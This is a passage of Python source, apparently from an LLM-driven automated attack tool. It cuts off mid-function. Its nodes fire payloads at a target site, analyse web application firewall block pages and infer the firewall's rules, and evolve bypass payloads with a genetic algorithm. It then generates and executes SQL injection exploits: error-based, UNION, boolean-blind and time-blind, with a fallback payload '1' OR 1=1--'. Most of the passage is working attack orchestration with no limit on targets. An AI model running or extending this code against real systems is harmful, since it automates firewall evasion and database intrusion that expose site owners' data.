                        log.append(f"[REFLECT] Recommended: {reflection['recommended_mutations'][:3]}")
                    # Store reflection in knowledge base as negative evidence
                    memory.add_knowledge(
                        waf_name=waf.get("waf_name", "unknown"),
                        technique=payload_entry.get("technique", "unknown"),
                        vuln_type=state.get("vuln_type", "sqli"),
                        payload=payload_str,
                        success=False,
                        confidence=0.1,
                        source="反射分析",
                        evidence=reflection.get("analysis", "")[:200],
                    )
                except Exception as e:
                    log.append(f"[REFLECT] Failed: {e}")

            next_idx = idx + 1
            if next_idx < len(payloads):
                return {
                    "execution_result": result, "payload_index": next_idx,
                    "history": history, "bypass_history": bypass_history,
                    "ga_history": ga_history,
                    "log": log, "iteration": iteration,
                    "consecutive_server_errors": server_errors,
                    "memory_stats": memory_stats,
                    "blocked_payload_count": blocked_count,
                    "hypotheses": hypotheses,
                    "hypothesis_history": hypothesis_history,
                }
            else:
                # In fast mode, skip block_analyze for first N blocked payloads
                skip_analyze_n = config.fast_test.skip_analyzer_first_n if config and config.fast_test.enabled else 0
                next_phase = "ga_bypass_evolve" if fast_mode and blocked_count <= skip_analyze_n else "block_analyze"
                if fast_mode and blocked_count <= skip_analyze_n:
                    log.append(f"[BYPASS-EXEC] FAST MODE: Skipping block analysis ({blocked_count}/{skip_analyze_n})")
                log.append(f"[BYPASS-EXEC] ALL_PAYLOADS_DONE: next_phase={next_phase}, iteration={iteration}")
                return {
                    "execution_result": result, "phase": next_phase,
                    "payload_index": idx + 1,
                    "history": history, "bypass_history": bypass_history,
                    "ga_history": ga_history,
                    "log": log, "iteration": iteration,
                    "consecutive_server_errors": server_errors,
                    "memory_stats": memory_stats,
                    "blocked_payload_count": blocked_count,
                    "hypotheses": hypotheses,
                    "hypothesis_history": hypothesis_history,
                }
        except Exception as e:
            log = list(state.get("log", []))
            log.append(f"[ERROR] bypass_execute failed: {e}\n{traceback.format_exc()[-200:]}")
            return {"phase": "ga_bypass_evolve", "log": log, "iteration": state.get("iteration", 0) + 1}
    return bypass_execute


def make_block_analyze_node(analyzer: WAFBlockAnalyzer, llm: LLMClient, fast_mode: bool = False, browser_analyzer=None, memory: AttackMemory = None):
    """Analyze blocked payloads to infer WAF rules and suggest bypasses."""
    def block_analyze(state: AttackState) -> dict:
        try:
            log = list(state.get("log", []))
            waf = state.get("waf_result", {})
            history = state.get("history", [])

            blocked = [h for h in history if h.get("result") == "blocked"]
            if not blocked:
                log.append("[ANALYZE] No blocked payloads to analyze -> GA evolve")
                return {"phase": "ga_bypass_evolve", "log": log}

            best_blocked = max(blocked, key=lambda h: h.get("fitness", 0))
            payload = best_blocked["payload"]

            log.append(f"[ANALYZE] Analyzing block: {payload[:60]}")

            # Browser-rendered block page analysis (first block only, to avoid overhead)
            browser_result_text = ""
            if browser_analyzer and len(state.get("block_history", [])) == 0:
                try:
                    import urllib.parse
                    endpoint = state.get("endpoint", "/")
                    param = state.get("param", "q")
                    method = state.get("method", "GET")
                    base_url = state.get("target_url", "")
                    if method == "GET" and base_url:
                        sep = "&" if "?" in endpoint else "?"
                        block_url = f"{base_url}{endpoint}{sep}{param}={urllib.parse.quote(payload[:200])}"
                    else:
                        block_url = f"{base_url}{endpoint}"

                    # Get cookies from scanner
                    cookies = {}
                    if hasattr(analyzer, '_scanner') and hasattr(analyzer._scanner, 'session'):
                        for c in analyzer._scanner.session.cookies:
                            cookies[c.name] = c.value

                    br = browser_analyzer.analyze_block_page(
                        url=block_url,
                        cookies=cookies,
                        take_screenshot=False,
                    )
                    if not br.error_message:
                        from tools.browser_analyzer import format_block_page_for_prompt
                        browser_result_text = format_block_page_for_prompt(br)
                        log.append(f"[BROWSER] Rendered block page — WAF indicators: {br.waf_indicators}")
                        if br.js_challenge:
                            log.append(f"[BROWSER] JS challenge detected: {br.challenge_type}")
                        if br.custom_block_page:
                            log.append(f"[BROWSER] Custom branded block page detected")
                except Exception as e:
                    log.append(f"[BROWSER] Analysis failed: {e}")

            if fast_mode:
                log.append("[ANALYZE] FAST MODE: Using quick analysis (no binary search)")
                analysis = analyzer.quick_analyze(
                    payload=payload,
                    endpoint=state.get("endpoint", "/"),
                    param=state.get("param", "q"),
                    method=state.get("method", "GET"),
                    waf_name=waf.get("waf_name", "unknown"),
                )
            else:
                analysis = analyzer.analyze_block(
                payload=payload,
                endpoint=state.get("endpoint", "/"),
                param=state.get("param", "q"),
                method=state.get("method", "GET"),
                waf_name=waf.get("waf_name", "unknown"),
            )

            analysis_dict = {
                "payload": analysis.payload,
                "is_blocked": analysis.is_blocked,
                "trigger_segments": [
                    {"text": t.text, "start": t.start, "end": t.end, "confidence": t.confidence}
                    for t in analysis.trigger_segments
                ],
                "rule_inference": {
                    "rule_type": analysis.rule_inference.rule_type if analysis.rule_inference else "",
                    "trigger_pattern": analysis.rule_inference.trigger_pattern if analysis.rule_inference else "",
                    "suggested_bypasses": analysis.rule_inference.suggested_bypasses if analysis.rule_inference else [],
                    "reasoning": analysis.rule_inference.reasoning if analysis.rule_inference else "",
                    "confidence": analysis.rule_inference.confidence if analysis.rule_inference else 0,
                },
                "probe_results": analysis.probe_results[:10],
                "browser_analysis": browser_result_text,
                "analysis_summary": analysis.analysis_summary,
            }

            block_history = list(state.get("block_history", []))
            block_history.append(analysis_dict)

            if analysis.trigger_segments:
                triggers = [t.text for t in analysis.trigger_segments]
                log.append(f"[ANALYZE] Trigger(s): {triggers}")
            if analysis.rule_inference:
                log.append(f"[ANALYZE] Rule: {analysis.rule_inference.rule_type} | Bypasses: {len(analysis.rule_inference.suggested_bypasses)}")
                if analysis.rule_inference.suggested_bypasses:
                    for bp in analysis.rule_inference.suggested_bypasses[:3]:
                        log.append(f"[ANALYZE] Suggested: {bp.get('technique', '?')} - {bp.get('reasoning', '')[:80]}")

            # ── Step 3: Infer rules from blocked responses ──
            inferred_rules = list(state.get("inferred_rules", []))
            bypass_history = state.get("bypass_history", [])
            if bypass_history:
                try:
                    new_rules = analyzer.infer_rules_from_blocked(
                        bypass_history=bypass_history,
                        endpoint=state.get("endpoint", "/"),
                        param=state.get("param", "q"),
                        method=state.get("method", "GET"),
                        waf_name=waf.get("waf_name", "unknown"),
                    )
                    if new_rules:
                        inferred_rules = new_rules
                        log.append(f"[INFER-RULES] Inferred {len(new_rules)} WAF rules from {len(bypass_history)} blocked responses")
                        for r in new_rules[:3]:
                            kws = r.get("trigger_keywords", [])[:3]
                            log.append(f"  -> {r.get('rule_type', '?')} (conf={r.get('confidence', 0):.2f}): {', '.join(kws) if kws else 'no keywords'}")
                        # Persist to knowledge base
                        if memory:
                            for r in new_rules:
                                memory.add_inferred_rule(
                                    waf_name=waf.get("waf_name", "unknown"),
                                    rule_type=r.get("rule_type", "unknown"),
                                    trigger_keywords=r.get("trigger_keywords", []),
                                    confidence=r.get("confidence", 0),
                                    evidence=r.get("evidence", ""),
                                    suggested_bypasses=r.get("suggested_bypasses", []),
                                )
                except Exception as e:
                    log.append(f"[INFER-RULES] Failed: {e}")

            # ── Step 4: Parallel Rule Inference (LLM + RIE concurrently) ──
            try:
                blocked_with_data = [h for h in bypass_history if h.get("result") == "blocked" and h.get("response_snippet")]
                if len(blocked_with_data) >= 5:
                    from prompts import BLOCK_ANALYZER_PROMPT
                    import json as _json

                    rie = RuleInferenceEngine()
                    blocked_responses = [
                        {"payload": h["payload"], "status_code": h.get("response_code", 403), "response_body": h.get("response_snippet", "")}
                        for h in bypass_history if h.get("result") == "blocked"
                    ]
                    passed_responses = [
                        {"payload": h["payload"], "status_code": h.get("response_code", 200), "response_body": h.get("response_snippet", "")}
                        for h in bypass_history if h.get("result") != "blocked"
                    ]
                    waf_name = waf.get("waf_name", "unknown")

                    # Build LLM prompt for parallel rule inference
                    llm_user_prompt = (
                        f"Blocked payloads: {_json.dumps(blocked_responses[:10], default=str)[:1000]}\n"
                        f"Passed payloads: {_json.dumps(passed_responses[:5], default=str)[:500]}\n"
                        f"WAF: {waf_name}"
                    )

                    # Run LLM rule inference and RIE concurrently
                    llm_result, rie_result = _run_parallel_rule_inference(
                        llm, rie, BLOCK_ANALYZER_PROMPT, llm_user_prompt,
                        blocked_responses, passed_responses, waf_name,
                    )

                    # Process LLM result
                    llm_rules = []
                    if isinstance(llm_result, Exception):
                        log.append(f"[PARALLEL] LLM rule inference failed: {llm_result}")
                    elif isinstance(llm_result, dict):
                        raw_rules = llm_result.get("rules", []) or llm_result.get("inferred_rules", [])
                        if isinstance(raw_rules, list):
                            for r in raw_rules:
                                if isinstance(r, dict):
                                    llm_rules.append(r)

                    # Process RIE result
                    rie_rules = []
                    if isinstance(rie_result, Exception):
                        log.append(f"[PARALLEL] RIE failed: {rie_result}")
                    else:
                        # RIE returns RuleInferenceResult with .rules list of WAFRule objects
                        for rie_rule in rie_result.rules:
                            rie_rules.append({
                                "rule_type": rie_rule.rule_type,
                                "trigger_keywords": rie_rule.trigger_keywords,
                                "confidence": rie_rule.confidence,
                                "evidence": rie_rule.evidence,
                                "suggested_bypasses": rie_rule.suggested_bypasses,
                            })

                    # Merge and deduplicate using _merge_rules
                    new_rules = _merge_rules(llm_rules, rie_rules)
                    if new_rules:
                        # Merge new parallel rules into existing inferred_rules
                        existing_keys = set()
                        for r in inferred_rules:
                            key = (r.get("rule_type", ""), tuple(sorted(r.get("trigger_keywords", []))))
                            existing_keys.add(key)

                        for rule in new_rules:
                            key = (rule.get("rule_type", ""), tuple(sorted(rule.get("trigger_keywords", []))))
                            if key in existing_keys:
                                # Update if higher confidence
                                for r in inferred_rules:
                                    if (r.get("rule_type") == rule.get("rule_type") and
                                            sorted(r.get("trigger_keywords", [])) == sorted(rule.get("trigger_keywords", []))):
                                        if rule.get("confidence", 0) > r.get("confidence", 0):
                                            r["confidence"] = rule["confidence"]
                                            r["evidence"] = rule.get("evidence", "")
                                            r["suggested_bypasses"] = rule.get("suggested_bypasses", [])
                                        break
                            else:
                                inferred_rules.append(rule)
                                existing_keys.add(key)

                        log.append(f"[PARALLEL] Inferred {len(new_rules)} rules ({len(llm_rules)} LLM + {len(rie_rules)} RIE, merged)")

                    # Persist high-confidence rules to ChromaDB
                    if memory:
                        for r in new_rules:
                            if r.get("confidence", 0) > 0.7:
                                memory.add_inferred_rule(
                                    waf_name=waf_name,
                                    rule_type=r.get("rule_type", "unknown"),
                                    trigger_keywords=r.get("trigger_keywords", []),
                                    confidence=r.get("confidence", 0),
                                    evidence=r.get("evidence", ""),
                                    suggested_bypasses=r.get("suggested_bypasses", []),
                                )
            except Exception as e:
                log.append(f"[PARALLEL] Rule inference failed: {e}")

            return {
                "block_analysis": analysis_dict,
                "block_history": block_history,
                "inferred_rules": inferred_rules,
                "phase": "ga_bypass_evolve",
                "log": log,
            }
        except Exception as e:
            log = list(state.get("log", []))
            log.append(f"[ERROR] block_analyze failed: {e}\n{traceback.format_exc()[-200:]}")
            return {"phase": "ga_bypass_evolve", "log": log}
    return block_analyze


def make_hypothesis_refine_node(llm: LLMClient, memory: AttackMemory = None):
    """Evaluate hypothesis test results and decide keep/refine/discard."""
    def hypothesis_refine(state: AttackState) -> dict:
        try:
            import json
            log = list(state.get("log", []))
            hypotheses = list(state.get("hypotheses", []))
            hypothesis_history = list(state.get("hypothesis_history", []))

            if not hypotheses:
                log.append("[HYPOTHESIS-REFINE] No hypotheses to refine -> GA evolve")
                return {"phase": "ga_bypass_evolve", "log": log, "hypotheses": [], "hypothesis_history": hypothesis_history}

            # Build test results summary for each hypothesis
            test_results = []
            for h in hypotheses:
                test_results.append({
                    "mechanism": h.get("mechanism", ""),
                    "test_count": h.get("test_count", 0),
                    "best_fitness": h.get("best_fitness", 0),
                    "bypass_count": h.get("bypass_count", 0),
                    "status": h.get("status", "active"),
                    "seed_payloads_used": h.get("seed_payloads", [])[:3],
                })

            # Only refine if we have meaningful test data
            tested_hyps = [h for h in hypotheses if h.get("test_count", 0) > 0]
            if not tested_hyps:
                log.append("[HYPOTHESIS-REFINE] No hypotheses have been tested yet -> GA evolve")
                return {"phase": "ga_bypass_evolve", "log": log, "hypotheses": hypotheses, "hypothesis_history": hypothesis_history}

            waf = state.get("waf_result", {})
            waf_name = waf.get("waf_name", "unknown")

            kb_ctx = ""
            if memory:
                try:
                    kb_entries = memory.query_knowledge(waf_name=waf_name, vuln_type=state.get("vuln_type", "sqli"), top_k=3)
                    if kb_entries:
                        kb_ctx = "; ".join(f"{e['technique']}({e['confidence']:.1f})" for e in kb_entries)
                except Exception:
                    pass

            # Add inferred rules context
            inferred_rules = state.get("inferred_rules", [])
            if inferred_rules:
                rules_summary = "; ".join(
                    f"{r.get('rule_type', '?')}({r.get('confidence', 0):.1f}): {', '.join(r.get('trigger_keywords', [])[:3])}"
                    for r in inferred_rules
                )
                kb_ctx = (kb_ctx + " | " if kb_ctx else "") + f"Inferred rules: {rules_summary}"

            from prompts import HYPOTHESIS_REFINE_PROMPT
            refine_prompt = HYPOTHESIS_REFINE_PROMPT.format(
                waf_name=waf_name,
                vuln_type=state.get("vuln_type", "sqli"),
                hypotheses=json.dumps(test_results, default=str),
                test_results=json.dumps(test_results, default=str),
                block_analysis=json.dumps(state.get("block_analysis", {}), default=str)[:500],
                kb_techniques=kb_ctx or "none",
            )
            refine_result = _llm_generate_with_retry(llm, refine_prompt, "Refine hypotheses now.")

            if isinstance(refine_result, dict):
                # Check for parse error
                if refine_result.get("parse_error"):
                    log.append(f"[HYPOTHESIS-REFINE] LLM returned invalid JSON — skipping refinement")
                # Apply updates to existing hypotheses
                updates = refine_result.get("hypothesis_updates", [])
                if isinstance(updates, list):
                    for update in updates:
                        if not isinstance(update, dict):
                            continue
                        mech = update.get("mechanism", "")
                        action = update.get("action", "keep")
                        for h in hypotheses:
                            if h.get("mechanism") == mech:
                                if action == "discard":
                                    h["status"] = "discarded"
                                    log.append(f"[HYPOTHESIS-REFINE] DISCARDED: {mech} — {update.get('reasoning', '')[:60]}")
                                elif action == "refine":
                                    h["status"] = "refined"
                                    if update.get("refined_payloads"):
                                        h["seed_payloads"] = update["refined_payloads"]
                                    if update.get("refined_mutation"):
                                        h["mutation_strategy"] = update["refined_mutation"]
                                    conf_delta = update.get("confidence_delta", 0)
                                    h["confidence"] = max(0, min(1, h.get("confidence", 0.5) + conf_delta))
                                    h["test_count"] = 0
                                    h["best_fitness"] = 0
                                    h["bypass_count"] = 0
                                    log.append(f"[HYPOTHESIS-REFINE] REFINED: {mech} (conf {conf_delta:+.2f}) — {update.get('reasoning', '')[:60]}")
                                else:
                                    log.append(f"[HYPOTHESIS-REFINE] KEEP: {mech} — {update.get('reasoning', '')[:60]}")
                                break

                # Add new hypotheses from LLM
                new_hyps = refine_result.get("new_hypotheses", [])
                if isinstance(new_hyps, list):
                    for nh in new_hyps:
                        if isinstance(nh, dict) and nh.get("mechanism"):
                            nh.setdefault("status", "active")
                            nh.setdefault("test_count", 0)
                            nh.setdefault("best_fitness", 0.0)
                            nh.setdefault("bypass_count", 0)
                            hypotheses.append(nh)
                            log.append(f"[HYPOTHESIS-REFINE] NEW: {nh['mechanism']} (conf={nh.get('confidence', 0):.2f}) — {nh.get('description', '')[:60]}")

                if refine_result.get("analysis"):
                    log.append(f"[HYPOTHESIS-REFINE] Analysis: {refine_result['analysis'][:120]}")
                if refine_result.get("waf_rule_inference"):
                    log.append(f"[HYPOTHESIS-REFINE] WAF rule inference: {refine_result['waf_rule_inference'][:120]}")

            # Record this refinement round in history
            hypothesis_history.append({
                "iteration": state.get("iteration", 0),
                "hypotheses_snapshot": [
                    {"mechanism": h.get("mechanism"), "status": h.get("status"), "best_fitness": h.get("best_fitness", 0), "test_count": h.get("test_count", 0)}
                    for h in hypotheses
                ],
            })

            # Store hypothesis results in knowledge base for cross-iteration learning
            if memory:
                waf_name = state.get("waf_result", {}).get("waf_name", "unknown")
                for h in hypotheses:
                    if h.get("test_count", 0) > 0:
                        try:
                            memory.add_hypothesis_result(
                                waf_name=waf_name,
                                mechanism=h.get("mechanism", ""),
                                action=h.get("status", "active"),
                                best_fitness=h.get("best_fitness", 0),
                                test_count=h.get("test_count", 0),
                                bypass_count=h.get("bypass_count", 0),
                                reasoning=refine_result.get("analysis", "")[:200] if isinstance(refine_result, dict) else "",
                            )
                        except Exception:
                            pass

            # Remove discarded hypotheses
            active_count = sum(1 for h in hypotheses if h.get("status") != "discarded")
            log.append(f"[HYPOTHESIS-REFINE] Active hypotheses: {active_count}/{len(hypotheses)}")

            return {
                "hypotheses": hypotheses,
                "hypothesis_history": hypothesis_history,
                "phase": "ga_bypass_evolve",
                "log": log,
            }
        except Exception as e:
            log = list(state.get("log", []))
            log.append(f"[ERROR] hypothesis_refine failed: {e}\n{traceback.format_exc()[-200:]}")
            return {"phase": "ga_bypass_evolve", "log": log, "hypotheses": state.get("hypotheses", []), "hypothesis_history": state.get("hypothesis_history", [])}
    return hypothesis_refine


def make_ga_bypass_evolve_node(mutator: MutatorAgent, memory: AttackMemory):
    """Evolve population for WAF bypass fitness."""
    def ga_bypass_evolve(state: AttackState) -> dict:
        try:
            log = list(state.get("log", []))
            iteration = state.get("iteration", 0)
            max_iter = state.get("max_iterations", 20)
            ga_gen = state.get("ga_generation", 0)
            population_data = state.get("population", [])

            if iteration >= max_iter:
                log.append(f"[GA-BYPASS] Max iterations ({max_iter}) reached.")
                memory.persist()
                return {"phase": "done", "log": log}

            population = [_deserialize_individual(d) for d in population_data]

            # Guard: empty population — skip GA and let bypass_generate create fresh payloads
            if not population and not (state.get("bypass_history") or []):
                log.append("[GA-BYPASS] Empty population with no bypass history — skipping to bypass_generate")
                return {"phase": "bypass_generate", "log": log, "iteration": iteration + 1}

            if not mutator.ga_engine:
                # Strategy-aware seeding: group by family, prioritize diverse families
                # Use population_data if available (evaluated individuals), else seed from bypass_history
                seed_source = population_data if population_data else [
                    {"payload": h.get("payload", ""), "family": h.get("technique", h.get("family", "unknown")),
                     "fitness": h.get("fitness", 0), "response_time": h.get("response_time", 0),
                     "response_code": h.get("response_code", 0), "response_snippet": h.get("response_snippet", "")[:300]}
                    for h in (state.get("bypass_history") or [])
                ]
                if seed_source and not population_data:
                    log.append(f"[GA-BYPASS] Seeding GA from {len(seed_source)} tested payloads (bypass_history)")
                family_groups = {}
                for d in seed_source:
                    fam = d.get("family", "unknown")
                    family_groups.setdefault(fam, []).append({"payload": d.get("payload", ""), "family": fam})

                # Log family distribution
                if family_groups:
                    fam_summary = ", ".join(f"{fam}:{len(payloads)}" for fam, payloads in family_groups.items() if fam)
                    log.append(f"[GA-BYPASS] Family distribution: {fam_summary}")

                # Build seed list: take top payloads from each family (round-robin)
                # Pass dicts with payload + family to preserve family info through GA
                seed_payloads = []
                family_queues = {fam: list(payloads) for fam, payloads in family_groups.items() if fam}
                while family_queues:
                    for fam in list(family_queues.keys()):
                        if family_queues[fam]:
                            seed_payloads.append(family_queues[fam].pop(0))
                        else:
                            del family_queues[fam]

                # Inject high-confidence payloads from knowledge base as GA seeds
                if memory:
                    try:
                        waf_name = state.get("waf_result", {}).get("waf_name", "unknown")
                        kb = memory.query_knowledge(waf_name=waf_name, vuln_type=state.get("vuln_type", "sqli"), top_k=3)
                        for entry in kb:
                            if entry.get("payload_example") and entry.get("confidence", 0) > 0.5:
                                seed_payloads.append({"payload": entry["payload_example"], "family": entry.get("technique", "kb_seed")})
                                log.append(f"[KB-GA] Injected seed from knowledge base: {entry['technique']} (conf={entry['confidence']:.2f})")
                    except Exception:
                        pass
                # Fallback: if still no seeds, use built-in payloads
                if not seed_payloads:
                    from agents.generator import GeneratorAgent
                    fallback_gen = GeneratorAgent(llm=None)
                    seed_payloads = [{"payload": p["payload"], "family": p.get("type", "default")} for p in fallback_gen._seed_payloads(state.get("vuln_type", "sqli"))]
                    log.append(f"[GA-BYPASS] Using {len(seed_payloads)} fallback seed payloads")
                waf = WAFResult(**state.get("waf_result", {})) if state.get("waf_result") else None
                mutator.initialize_ga(seed_payloads, state.get("vuln_type", "sqli"), waf)
                mutator.ga_engine.generation = ga_gen

            if population and mutator.ga_engine.evaluator.baseline_time == 0.1:
                benign = [p for p in population if p.fitness < 0.2]
                if benign:
                    mutator.ga_engine.set_baseline(
                        benign[0].response_time, benign[0].response_snippet, benign[0].response_code,
                    )

            # Guard: if population is empty but GA engine exists, re-initialize with fallback seeds
            if not population and mutator.ga_engine:
                from agents.generator import GeneratorAgent
                fallback_gen = GeneratorAgent(llm=None)
                seed_payloads = [{"payload": p["payload"], "family": p.get("type", "default")} for p in fallback_gen._seed_payloads(state.get("vuln_type", "sqli"))]
                log.append(f"[GA-BYPASS] Re-initializing GA with {len(seed_payloads)} fallback seeds (empty population)")
                waf = WAFResult(**state.get("waf_result", {})) if state.get("waf_result") else None
                mutator.initialize_ga(seed_payloads, state.get("vuln_type", "sqli"), waf)
                mutator.ga_engine.generation = ga_gen
                # Use the freshly initialized population (unevaluated seeds) so evolve() has something to work with
                population = mutator.ga_engine.population

            # Island-model evolution: use per-hypothesis sub-populations when active hypotheses exist
            hypotheses = list(state.get("hypotheses", []))
            active_hyps = [h for h in hypotheses if h.get("status") != "discarded"]

            if active_hyps and hasattr(mutator.ga_engine, 'evolve_islands'):
                new_population = mutator.ga_engine.evolve_islands(
                    evaluated_population=population,
                    hypotheses=active_hyps,
                    migration_threshold=0.7,
                    min_island_size=4,
                )
                log.append(f"[GA-BYPASS] Island-model evolution with {len(active_hyps)} active hypotheses")
            else:
                new_population = mutator.ga_engine.evolve(population)

            stats = mutator.ga_engine.get_stats()

            log.append(f"[GA-BYPASS] Gen {stats['generation']}: best={stats['best_fitness']:.3f} avg={stats['avg_fitness']:.3f}")
            if stats.get("best_payload"):
                log.append(f"[GA-BYPASS] Best: {stats['best_payload'][:60]}")
            # Log first 3 new payloads to verify mutation
            for i, ind in enumerate(new_population[:3]):
                log.append(f"[GA-BYPASS]   [{i}] {ind.payload[:60]} (fam={ind.family}, muts={ind.mutations_applied})")

            tree = dict(state.get("evolution_tree", {}))
            tree.update(mutator.ga_engine.evolution_tree)

            new_pop_data = [_serialize_individual(ind) for ind in new_population]

            # Seed ga_history with generation 0 if this is the first evolution
            ga_history = list(state.get("ga_history", []))
            if not ga_history and population:
                fitnesses = [p.fitness for p in population]
                gen0_stats = {
                    "generation": 0,
                    "best_fitness": max(fitnesses) if fitnesses else 0,
                    "avg_fitness": sum(fitnesses) / max(len(fitnesses), 1),
                    "worst_fitness": min(fitnesses) if fitnesses else 0,
                    "best_payload": max(population, key=lambda x: x.fitness).payload if population else "",
                    "population_size": len(population),
                }
                ga_history.append(gen0_stats)
            ga_history.append(stats)

            # Record hypothesis_history snapshot for per-hypothesis fitness visualization
            hypothesis_history = list(state.get("hypothesis_history", []))
            if hypotheses:
                hypothesis_history.append({
                    "iteration": iteration,
                    "hypotheses_snapshot": [
                        {
                            "mechanism": h["mechanism"],
                            "status": h.get("status", "active"),
                            "best_fitness": h.get("best_fitness", 0),
                            "test_count": h.get("test_count", 0),
                        }
                        for h in hypotheses
                    ],
                })

            return {
                "population": new_pop_data,
                "ga_generation": ga_gen + 1,
                "ga_stats": stats,
                "ga_history": ga_history,
                "hypothesis_history": hypothesis_history,
                "hypotheses": hypotheses,
                "iteration": iteration,
                "phase": "bypass_generate",
                "evolution_tree": tree,
                "log": log,
            }
        except Exception as e:
            log = list(state.get("log", []))
            log.append(f"[ERROR] ga_bypass_evolve failed: {e}\n{traceback.format_exc()[-200:]}")
            return {"phase": "bypass_generate", "log": log}
    return ga_bypass_evolve


# ── Stage 2: Exploit Nodes ─────────────────────────────────────────────


def make_exploit_generate_node(generator: GeneratorAgent, llm: LLMClient):
    """Generate payloads optimized for exploitation (WAF already bypassed)."""
    def exploit_generate(state: AttackState) -> dict:
        try:
            log = list(state.get("log", []))
            population = state.get("population", [])
            ga_gen = state.get("ga_generation", 0)
            bypass_payload = state.get("bypass_payload", "")

            # Get injection fingerprint from recon
            fingerprint = state.get("injection_fingerprint", {})
            quote_type = fingerprint.get("quote_type", "unknown")
            closure = fingerprint.get("closure_char", "'")
            comment = fingerprint.get("comment_style", "--")
            dbms_hint = fingerprint.get("dbms_hint", "unknown")

            # Determine strategy hint based on current_strategy (from rotation) + history
            history = state.get("history", [])
            current_strategy = state.get("current_strategy", "error")
            recommended_strategy = state.get("recommended_strategy", "unknown")
            exploit_attempts = [h for h in history if h.get("iteration", 0) > 0]

            # Use recon-recommended strategy if no rotation has happened yet
            if recommended_strategy != "unknown" and state.get("consecutive_low_fitness", 0) == 0:
                current_strategy = recommended_strategy

            strategy_map = {
                "error": "Focus ONLY on ERROR-BASED: UPDATEXML(), EXTRACTVALUE(), EXP(), FLOOR()+RAND(). Do NOT use UNION or blind techniques.",
                "union": "Focus ONLY on UNION-BASED: Try UNION SELECT with column counts 1-15. Do NOT use error or blind techniques.",
                "blind": "Focus ONLY on BOOLEAN-BLIND: Use SUBSTRING()+ASCII() to extract data character by character. Do NOT use error or UNION.",
                "time": "Focus ONLY on TIME-BLIND: Use SLEEP()/BENCHMARK() with conditional logic. Do NOT use error, UNION, or boolean techniques.",
            }
            strategy_hint = strategy_map.get(current_strategy, strategy_map["error"])

            if exploit_attempts:
                last_results = [h.get("result") for h in exploit_attempts[-3:]]
                if all(r == "failure" for r in last_results):
                    strategy_hint += " Previous attempts failed — try variations within this strategy."

            if population and ga_gen > 0:
                payloads = [
                    {"payload": d["payload"], "type": "ga_exploit",
                     "reasoning": f"GA exploit gen {ga_gen}"}
                    for d in population
                ]
                log.append(f"[EXPLOIT-GEN] Using GA population ({len(payloads)}, gen {ga_gen})")
            elif bypass_payload:
                from prompts import EXPLOIT_OPTIMIZER_PROMPT
                import json

                # Build fingerprint context for LLM
                if quote_type != "unknown":
                    fingerprint_context = (
                        f"  quote_type: {quote_type}\n"
                        f"  closure_char: {closure}\n"
                        f"  comment_style: {comment}\n"
                        f"  dbms_hint: {dbms_hint}\n"
                        f"  CRITICAL: All payloads MUST start with closure '{closure}' and end with '{comment}'\n"
                    )
                else:
                    fingerprint_context = "  Not yet determined. Use single-quote (') as default closure with -- comment.\n"

                # Build recon analysis context
                recon_analysis_parts = []
                fp = state.get("injection_fingerprint", {})
                if fp.get("sql_error_evidence"):
                    recon_analysis_parts.append(f"SQL errors found: {', '.join(fp['sql_error_evidence'][:5])}")
                if fp.get("data_leak_evidence"):
                    leak_patterns = [d.get("pattern", "") for d in fp["data_leak_evidence"][:5]]
                    recon_analysis_parts.append(f"Data leak signals: {', '.join(leak_patterns)}")
                if fp.get("recommended_strategy"):
                    recon_analysis_parts.append(f"Recon recommended strategy: {fp['recommended_strategy'].upper()}")
                if fp.get("dbms_hint") and fp["dbms_hint"] != "unknown":
                    recon_analysis_parts.append(f"DBMS: {fp['dbms_hint']}")
                recon_analysis = "\n".join(recon_analysis_parts) if recon_analysis_parts else "No detailed analysis available."

                llm_result = _llm_generate_with_retry(
                    llm,
                    EXPLOIT_OPTIMIZER_PROMPT,
                    f"bypass_payload: {bypass_payload}\n"
                    f"bypass_technique: {state.get('bypass_technique', 'unknown')}\n"
                    f"vuln_type: {state.get('vuln_type', 'sqli')}\n"
                    f"endpoint: {state.get('endpoint', '/')}\n"
                    f"exploit_history: {json.dumps(state.get('history', [])[-5:], default=str)}\n"
                    f"strategy_hint: {strategy_hint}\n"
                    f"fingerprint_context: {fingerprint_context}\n"
                    f"recon_analysis: {recon_analysis}\n"
                    f"count: 8",
                )

                fallback = [{"payload": bypass_payload, "type": "bypass_base", "reasoning": "direct"}]
                payloads = _normalize_llm_payloads(llm_result, fallback)

                # Auto-fix closure chars if fingerprint is known
                if quote_type != "unknown" and closure:
                    fixed_payloads = []
                    for p in payloads:
                        pl = p.get("payload", "")
                        # Ensure payload uses correct closure
                        if not pl.startswith(closure) and not pl[0:1].isdigit():
                            pl = f"1{closure}{pl}"
                        if comment and not pl.rstrip().endswith(comment):
                            pl = f"{pl.rstrip()} {comment}"
                        p["payload"] = pl
                        fixed_payloads.append(p)
                    payloads = fixed_payloads

                log.append(f"[EXPLOIT-GEN] Fingerprint: quote={quote_type}, closure='{closure}', dbms={dbms_hint}")
                log.append(f"[EXPLOIT-GEN] Strategy: {strategy_hint}")
                log.append(f"[EXPLOIT-GEN] Generated {len(payloads)} exploit variants")
                for p in payloads[:4]:
                    stype = p.get('strategy', p.get('exploit_type', '?'))
                    log.append(f"  -> [{stype}] {p.get('payload', '')[:70]}")
            else:
                payloads = generator.generate(
                    vuln_type=state.get("vuln_type", "sqli"),
                    endpoint=state.get("endpoint", "/"),
                    field_name=state.get("param", "q"),
                    history=state.get("history", []),
                )
                log.append(f"[EXPLOIT-GEN] Created {len(payloads)} exploit payloads")

            return {
                "current_payloads": payloads,
                "payload_index": 0,
                "phase": "exploit_execute",
                "log": log,
            }
        except Exception as e:
            log = list(state.get("log", []))
            log.append(f"[ERROR] exploit_generate failed: {e}\n{traceback.format_exc()[-200:]}")
            # Fallback: use bypass payload directly
            bypass_payload = state.get("bypass_payload", "1' OR 1=1--")
            return {
                "current_payloads": [{"payload": bypass_payload, "type": "fallback", "reasoning": "error fallback"}],
                "payload_index": 0,
                "phase": "exploit_execute",
                "log": log,
            }
    return exploit_generate


def make_exploit_execute_node(
    executor: ExecutorAgent,
    memory: AttackMemory,
    evaluator: FitnessEvaluator,
    llm: LLMClient = None,
):
    """Execute payloads for actual exploitation (vulnerability confirmation)."""
    def exploit_execute(state: AttackState) -> dict:
        try:
            log = list(state.get("log", []))
            payloads = state.get("current_payloads", [])
            idx = state.get("payload_index", 0)
            iteration = state.get("iteration", 0)
            max_iter = state.get("max_iterations", 20)

            if iteration >= max_iter:
                log.append(f"[EXPLOIT] Max iterations ({max_iter}) reached.")
                memory.persist()
                return {"phase": "done", "log": log, "iteration": iteration}

            if idx >= len(payloads):
